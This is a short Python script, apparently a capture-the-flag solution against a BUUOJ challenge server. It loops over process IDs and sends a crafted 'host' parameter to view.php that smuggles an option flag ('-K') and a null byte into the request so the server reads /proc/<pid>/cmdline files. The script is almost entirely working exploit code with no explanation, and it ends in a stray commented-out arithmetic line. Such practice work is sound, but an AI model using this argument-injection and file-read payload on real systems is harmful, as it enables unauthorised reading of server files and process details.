import requests

for i in range(1, 100):
    r = requests.get("http://e7d567db-2813-428a-9fb3-81a32f242d30.node4.buuoj.cn:81/view.php?host=-K/proc/" + str(i) + "/cmdline%00")
    print(r.text)
    print(i)

#print((((((35753)-(1042798))-(38415))+(399379))-(535251)))